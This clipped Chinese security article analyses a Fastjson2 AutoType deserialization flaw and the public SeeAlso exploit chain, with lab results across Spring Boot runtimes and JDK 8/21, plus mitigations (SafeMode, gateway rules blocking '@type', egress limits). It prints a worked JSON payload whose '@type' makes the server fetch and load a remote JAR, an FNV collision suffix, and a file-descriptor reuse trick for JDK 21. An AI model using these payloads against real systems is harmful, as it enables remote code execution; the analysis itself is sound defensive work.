---
title: 【微信】Fastjson2 AutoType 安全问题确认：现有版本尚无正式修复，公开 EXP 到底能走多远
source: https://mp.weixin.qq.com/s/6Ph43vq3XrBj5n3s21Cw_w
source_host: mp.weixin.qq.com
clip_date: 2026-07-29T09:36:57+08:00
trace_id: 9499dc8c-41d2-47a2-8270-32dd1bda29ab
content_hash: aa28f3c102908c5e30163a36693eba1fae2112ca65ac5a1f65915d1516a3df64
status: synced
tags:
  - 微信
  - 漏洞分析
  - 反序列化漏洞
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: Fastjson2 的 AutoType 类型解析存在已确认的安全缺陷，公开的 SeeAlso 攻击链虽不依赖 FNV 碰撞，但其利用条件受到业务基类配置和类加载器环境的严格限制，JDK 21 也无法完全阻断该利用链。
ai_summary_style: key-points
images_status:
  total: 4
  succeeded: 4
  failed_urls: []
notion_page_id: 3ac75244-d011-8121-8787-f7575af3f284
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> Fastjson2 的 AutoType 类型解析存在已确认的安全缺陷，公开的 SeeAlso 攻击链虽不依赖 FNV 碰撞，但其利用条件受到业务基类配置和类加载器环境的严格限制，JDK 21 也无法完全阻断该利用链。
> 
> - **官方确认状态：** 维护方书面确认了安全问题，指出 PR #7695 并非已合并的正式修复，且所有已发布版本均不包含修复代码。
> - **SeeAlso 攻击链核心：** 该利用链无需 FNV 碰撞，而是依赖业务代码使用带 `@JSONType(seeAlso=...)` 的基类来解析请求体，攻击者控制的类型名便能进入 `TypeUtils.loadClass()`。
> - **关键环境限制：** 攻击成功需依赖 Spring Boot 可执行 JAR 及其特定的类加载器，外置 WAR 包和 Tomcat/Jetty 独立部署形态在实验中未触发远程 JAR 加载。
> - **JDK 21 的双阶段利用：** JDK 21 会因类文件内部名称非法而在一阶段触发 `ClassFormatError`，但已下载的 JAR 缓存文件可通过进程文件描述符复用，在二阶段完成恶意类初始化。
> - **防御组合拳：** 正式修复前，必须组合开启 JVM 参数 `-Dfastjson2.parser.safeMode=true`，在网关层解析 JSON 后拦截任意层级的 `@type` 键，并严格限制后端 JVM 的出站网络。

**天黑说嘿话** *2026年7月29日 09:22*

PR #7695 没有合并；公开 SeeAlso 路线省去了 FNV 碰撞，却增加了业务类型和类加载器条件。本文复核 Spring Boot 2/3、四种 Web 运行时、JDK 8/21、外置 WAR、非 Spring 框架和 SafeMode 对照组。

Fastjson2 维护方已经确认 AutoType 类型解析路径存在安全问题，并表示正在推进正式修复。维护方同时澄清：PR #7695 已关闭且没有合并进主干，回复时所有已发布版本都没有包含正式修复。

风险需要处置，范围也要说清。公开 `ObjectReaderSeeAlso` EXP 在特定条件下能把攻击者控制的类型名送进类加载器；它不依赖 FNV 前缀碰撞，但需要业务接口使用带 `SeeAlso` 的目标基类。公开远程 JAR 形式还明显依赖 Spring Boot 可执行 JAR 的类加载环境。

本地实验观察到三组现象：

-   Spring Boot 2.7 + JDK 8 的 Tomcat、Jetty、Undertow、WebFlux 四组均完成远程 marker 类初始化；
    
-   Spring Boot 2.7/3.3 + JDK 21 的八组环境均先下载 JAR，再触发 `ClassFormatError` ；同一进程继续复用残留 JAR 文件描述符后，八组均完成第二阶段 marker 初始化；
    
-   Solon、Jersey、RESTEasy、纯 Java、Tomcat/Jetty 外置 WAR 都进入了 `ObjectReaderSeeAlso` ，但所测部署形态没有产生远程 JAR 请求。
    

正式修复发布前，业务先开启：

```
-Dfastjson2.parser.safeMode=true
```

## 官方确认了什么

维护方在 issue #7702 的回复里确认了四项信息：

1.  Fastjson2 的 AutoType 类型解析路径存在安全问题；
    
2.  问题在特定条件下可能被利用；
    
3.  PR #7695 不是已合并的正式修复；
    
4.  正式修复会通过独立 PR 合并，并随后续版本发布。
    

![图 1：Fastjson2 维护方回复](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/9b6984b0f059ca2d.png)

图 1：Fastjson2 维护方回复

PR #7695 仍然有分析价值。候选补丁主要做了三件事：

-   拒绝类型名中的 `:`、`!` 等 URL 特殊字符；
    
-   白名单哈希命中后继续核对真实文本前缀；
    
-   在 `TypeUtils.loadClass()` 前补充统一校验。
    

这些改动指向同一个边界：用户控制的类型名经过不足的校验后进入了类加载器。最终修复代码可能调整，处置状态应以新 PR、Release 和安全公告为准。

## 两条 AutoType 路线不要混在一起

此前披露的 FNV 路线发生在 AutoType 默认关闭分支。程序逐字符计算类型名的运行中哈希，只要某个中间前缀命中 `acceptHashCodes` ，旧逻辑就可能继续加载完整类型名。

这条路径可以概括为：

```
校验：prefix
使用：prefix + suffix
```

### FNV 前缀碰撞 Payload 长什么样

这条路线里的“碰撞字符”不是一组可以到处复用的固定尾巴。Payload 的结构是： **确定网络地址、端口和路径后，针对它们前面的全部字符重新求一段碰撞后缀，再在后面拼接待加载的类资源名。**

```
jar:http:..HOST:PORT.PATH.COLLISION_SUFFIX!.PACKAGE.CLASS
└────────── 参与前缀碰撞计算 ──────────┘└─ 哈希命中后交给类加载器 ─┘
```

以本文本地 Marker 实验为例，JSON 形态如下：

```json
[
{
"@type":"jar:http:..localhost:18181.x.\ubabf\u0a51\u0290\u4cd2!.probe.Marker",
"value":1
}
]
```

JSON 解码后，Fastjson2 实际参与计算的前缀是：

```
jar:http:..localhost:18181.x.몿ੑʐ䳒
```

按照代码中的逐字符 FNV-1a 计算，这段前缀的结果为：

```
FNV1a64(prefix) = 0xa8aaa929446ffce4
                = -6293031534589903644L
```

这正是 `ObjectReaderProvider` 默认写入 `acceptHashCodes` 的哈希。命中发生在 `!` 之前，但旧逻辑随后交给 `loadClass()` 的仍是包含 `!.probe.Marker` 的完整字符串。中括号只表示请求根节点是数组，用来稳定进入通用对象元素的解析入口；它不参与 `@type` 的哈希，也不是漏洞成立的关键。

需要特别注意： `HOST` 、 `PORT` 、 `PATH` 都属于被计算的前缀。任意一项发生变化，抵达碰撞后缀之前的 FNV 状态都会变化， `\ubabf\u0a51\u0290\u4cd2` 也就不再对应这个默认哈希，必须针对新的完整前缀重新计算。因此，上面的字符串是 `localhost:18181/x` 这一组本地条件下的样例，不是任意地址都能复用的通用 Payload。

检查对象和加载对象不是同一段文本，因此候选补丁增加了真实前缀核对。

公开 EXP 走的是另一条入口。示例接口把请求体解析为带有 `@JSONType(seeAlso=...)` 的具体基类，Fastjson2 因而创建 `ObjectReaderSeeAlso` 。这个 Reader 的内部特征携带 `SupportAutoType` ，攻击者控制的类型名可以继续进入 `TypeUtils.loadClass()` 。

```
外部 JSON
    ↓
JSON.parseObject(body, BaseType.class)
    ↓
ObjectReaderSeeAlso
    ↓
checkAutoType(typeName, BaseType, features)
    ↓
TypeUtils.loadClass(typeName)
    ↓
线程上下文类加载器
```

SeeAlso 路线省去了碰撞计算，却把难点转移到了业务类型。远程类需要继承接口实际使用的基类，攻击者还要掌握几项信息：

-   基类完整包名；
    
-   基类是否配置 `SeeAlso` ；
    
-   接口是否按这个具体类型解析请求体；
    
-   基类是否允许外部子类继承；
    
-   生成类是否能通过 `isAssignableFrom()` 检查。
    

公开仓库同时提供目标程序和远程类生成器，上述信息全部已知。开源项目、公开 SDK 和版本固定的商业产品更容易暴露这些信息；关闭详细错误、业务代码不可见的黑盒系统，定位成本会高很多。

所以，“无需 FNV 碰撞”不等于“任意 Fastjson2 接口都能直接套用同一请求”。

## 类加载器决定公开链能走多远

同一个 `Animal.class` 解析入口放进不同部署形态后，结果出现了明显分层。

![图 2：跨运行时实验矩阵](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/061eba545aa08a4a.png)

图 2：跨运行时实验矩阵

Spring Boot 2.7 的 Jetty、Undertow 和 WebFlux 请求线程使用 `LaunchedURLClassLoader` ；Tomcat 请求线程显示 `TomcatEmbeddedWebappClassLoader` 。Spring Boot 3 的 Tomcat 和 Jetty 虽然显示容器 WebApp ClassLoader，其父加载器仍是 Boot 的 `LaunchedClassLoader` 。

外置 WAR 组把 Fastjson2 放在 `WEB-INF/lib` ，Tomcat 和 Jetty 都创建了 `ObjectReaderSeeAlso` ，但远程 HTTP 计数保持为 0。Solon、Jersey、RESTEasy 和纯 Java程序也得到相同的负面对照结果。

问题出在运行时资源解析方式，而不是 Spring MVC 这个名字。换用 Boot 内置 Tomcat、Jetty、Undertow 或 Netty，也没有切断公开链的远程获取阶段。

## JDK 8 和 JDK 21 不是同一个结果

公开 EXP 的特殊类型名大致呈现为：

```
jar:http:..HOST:PORT.PATH!.Marker
```

外部字符串没有 `/` 。Spring Boot 类加载器查找类资源时会把点号转换成路径分隔符，最终尝试访问：

```
jar:http://HOST:PORT/PATH!/Marker.class
```

JDK 8 实验完成了远程 JAR 下载、类定义和静态初始化。JDK 21 也会下载 JAR，但 HotSpot 随后校验 class 文件内部名称。 `http://` 对应的连续斜杠触发：

```
ClassFormatError:
Illegal class name "jar:http://HOST:PORT/PATH!/Marker"
```

所以，JDK 21 一阶段只走到“下载完成、类定义失败”。通过 Java 层的外部类名检查，不代表 class 文件内部名称也会通过。

## JDK 21 的 FD 续接补上了后半段

一阶段出现 `ClassFormatError` 后，Spring Boot 类加载器已经把远程 JAR 保存为临时缓存文件。目录项可能已经删除，JVM 仍持有打开的文件描述符。

```
远程 JAR
    ↓
jar_cache 临时文件
    ↓
JVM 持有 FD
```

Linux 可以通过 `/proc/self/fd/N` 访问进程 FD，macOS 对应 `/dev/fd/N` 。第二次请求落到同一 JVM 后，可以从 FD 重新打开 JAR。第二阶段不再使用带 `http://` 的内部名称，因此避开一阶段的连续斜杠问题。

![图 3：八组 FD 续接结果](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/31c4bb07f3b2e3ec.png)

图 3：八组 FD 续接结果

八组成功不能直接换算成生产成功率。FD 续接还依赖几项工程条件：

-   两次请求进入同一个 JVM；
    
-   一阶段已经下载并打开远程 JAR；
    
-   类加载器在异常后继续持有缓存 FD；
    
-   第二阶段命中正确 FD；
    
-   操作系统暴露进程 FD 路径；
    
-   远程类满足目标基类的继承关系；
    
-   后端允许访问攻击者控制的 HTTP 服务。
    

负载均衡、实例扩缩容、FD 生命周期、请求限速、容器权限和出站策略都会改变成功率。公开一阶段失败只能限定那份代码，JDK 21 也不应被直接归为低优先级。

## 消息中间件依赖不等于消息自动进入 Fastjson2

本地实验直接调用了 Kafka、RabbitMQ、RocketMQ 和 Dubbo 的实际默认转换边界。

-   Spring Kafka `StringJsonMessageConverter` 使用 Jackson；
    
-   Spring Rabbit `Jackson2JsonMessageConverter` 使用 Jackson；
    
-   RocketMQ Spring 的组合转换器把 JSON 转成普通业务对象；
    
-   Dubbo Hessian2 和 Fastjson2 字符串往返都把 `@type` 保持为字符串数据。
    

上述测试都没有产生远程 JAR 请求。

如果监听器收到 String 后又显式调用 `JSON.parseObject(payload, BaseType.class)` ，风险判断要回到宿主应用的类加载环境。运行在 Spring Boot 可执行 JAR 中的消费程序，仍需按 Boot 组结果排查。

## 正式修复前先切断公开路径

Fastjson2 会在初始化时读取 SafeMode。推荐 JVM 参数：

```
-Dfastjson2.parser.safeMode=true
```

兼容属性也有效：

```
-Dfastjson.parser.safeMode=true
```

两个属性不要设置成冲突的值。修改 JVM 启动参数后要重启应用。

![图 4：SafeMode 对照实验](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/1010a61eab4041e2.png)

图 4：SafeMode 对照实验

### Nginx 作为第二道防线

业务完全不使用多态 `@type` 时，网关可以拒绝任意层级出现这个键的 JSON。

只有在 WAF、njs 或 Lua 已经读取请求体时，原始字符串正则才适合短期应急。标准 Nginx rewrite 阶段的 `$request_body` 可能为空：

```
if ($request_body ~* '"\s*@type\s*"\s*:') {
    return 403;
}
```

这条 `if` 不适合作为正式防线。Nginx 原生正则不理解 JSON 结构，还会受到请求体落盘、Unicode 转义和压缩请求体影响。更稳妥的方式是让 ModSecurity、Nginx JavaScript 或 OpenResty Lua 解析 JSON，再递归检查键名。

ModSecurity 可以先启用 JSON 请求体解析器：

```ruby
SecRule REQUEST_HEADERS:Content-Type \
"@rx (?i)^application/(?:[a-z0-9.+-]+\+)?json" \
"id:100100,phase:1,pass,nolog,ctl:requestBodyProcessor=JSON"

SecRule ARGS_NAMES "@contains @type" \
"id:100101,phase:2,deny,status:403,log,msg:'Blocked JSON @type key'"
```

严格 API 还可以拒绝未经网关检查的压缩 JSON，并限制请求体大小：

```
if ($http_content_encoding != "") {
    return 415;
}

client_max_body_size 1m;
```

### 收紧后端出站

公开链需要后端 JVM 主动获取远程 JAR。容器 NetworkPolicy、主机防火墙或云安全组可以把出站目标收敛到业务白名单，重点限制：

```
业务 JVM → 任意公网 HTTP/HTTPS
业务 JVM → 非必要内网地址
业务 JVM → 云元数据与管理网段
```

网关处理入站 JSON，出站策略负责截断外部资源获取。两者覆盖的链路不同。

处置优先级可以压缩成五步：

```
P0  JVM 开启 SafeMode
P1  网关解析 JSON 后拒绝任意层级的 @type
P2  限制业务 JVM 出站网络
P3  盘点 SeeAlso 基类和 Spring Boot 可执行 JAR
P4  跟进并升级官方正式修复版本
```

## 最后说说我的判断

官方回复已经结束了“问题是否存在”的争论，但没有把所有运行环境归成同一种风险。

Fastjson2 的类型解析路径存在缺陷；SeeAlso 公开链也确实省去了 FNV 碰撞。完整利用还要同时满足业务基类、打包方式、类加载器、JDK、出站网络，以及高版本 JDK 的同进程 FD 条件。

这些限制不适合拿来忽略风险。Spring Boot 可执行 JAR 是常见部署方式，JDK 21 的一阶段异常也没有阻止本地二阶段 marker 初始化。资产排查至少要同时记录：

```
Fastjson2 版本
解析目标类型
SeeAlso 配置
Spring Boot 打包方式
JDK 版本
实例调度方式
出站网络策略
SafeMode 状态
```

补丁发布前，SafeMode、解析后拦截 `@type` 和出站白名单已经可以切断公开链的关键位置。正式修复版本发布后，再用同一组对照实验复测，确认远程 GET、FD 残留和 marker 三项都消失。

* * *
